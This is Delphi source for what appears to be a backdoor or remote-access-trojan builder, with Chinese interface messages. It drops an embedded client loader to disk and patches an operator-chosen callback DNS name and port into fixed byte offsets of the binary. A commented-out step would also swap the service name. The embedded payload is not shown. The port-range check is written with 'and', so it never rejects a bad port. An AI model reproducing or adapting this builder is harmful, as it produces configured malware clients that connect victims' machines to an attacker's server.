unit UnitBuilder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls;

type
  TFormBuilder = class(TForm)
    StatusBar1: TStatusBar;
    Label1: TLabel;
    Edit_File: TEdit;
    Label2: TLabel;
    Edit_DNS: TEdit;
    Label3: TLabel;
    Edit_Port: TEdit;
    Button1: TButton;
    Button2: TButton;
    SD_Client: TSaveDialog;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormBuilder: TFormBuilder;

implementation

{$R *.dfm}

uses
  Unit_ClinetLoader;

const
  DNS_offset      = $000049FC;
  Port_Offset     = $000048E2;
  
  Service1_Offset = $000048A0;
  Service2_Offset = $00001390;


function ClinetLoaderSaveFile(SaveFile: String):Boolean;
var
  hFile:THandle;
  BytesWrite: dword;
begin
  Result:=False;
  hFile := CreateFile(Pchar(SaveFile),GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ,nil,CREATE_ALWAYS,0,0);
  if hFile = INVALID_HANDLE_VALUE then Exit;
  if WriteFile(hFile, ClinetLoaderBuf, ClinetLoaderSize, BytesWrite, nil) then Result:=True;
  CloseHandle(hFile);
end;

Procedure KWrite(kfil: string; koff: LongInt; kdat: string; klen: LongInt);
var
  f: File of Byte;
  i: LongInt;
  c: Byte;
begin
  AssignFile(f,kfil);
  Reset(f);
  Seek(f,koff);
  for i:=1 to klen do begin
    if i>length(kdat)
     then c:=0
     else c:=ord(kdat[i]);
    Write(f,c);
  end;
  CloseFile(f);
end;

procedure TFormBuilder.Button1Click(Sender: TObject);
var
  StrFile: String;
  iPort, iTemp: Integer;
  hFile: THandle;
  dwBytesWrite: DWORD;
begin
  if SD_Client.Execute then
  begin
    StrFile := SD_Client.FileName;
    if Length(StrFile) = 0 then Exit;

    DeleteFile(Pchar(StrFile));
    if ClinetLoaderSaveFile(StrFile) then
    begin
      try
        iPort := StrToInt(Edit_Port.Text);
        if (iPort < 1) and (iPort > 65535) then
        begin
          ShowMessage('请输入正确的端口');
          Exit;
        end;
        hFile := CreateFile(Pchar(StrFile), GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
        if hFile = INVALID_HANDLE_VALUE then Exit;

        //  写入端口信息
        SetFilePointer(hFile, Port_Offset, nil, FILE_BEGIN);
        iTemp := 0;
        WriteFile(hFile, iTemp, Sizeof(DWORD), dwBytesWrite, nil);
        SetFilePointer(hFile, Port_Offset, nil, FILE_BEGIN);
        WriteFile(hFile, iPort, Sizeof(DWORD), dwBytesWrite, nil);
        CloseHandle(hFile);

        //  写入DNS
        KWrite(StrFile, DNS_offset, Edit_DNS.Text, 42);
        //  写入替换服务名称
        //KWrite(StrFile, Service1_Offset, Edit_File.Text, 36);
        ShowMessage('生成成功:' + StrFile);
      except

      end;
    end;
  end;
end;

procedure TFormBuilder.Button2Click(Sender: TObject);
begin
  Close;
end;

end.
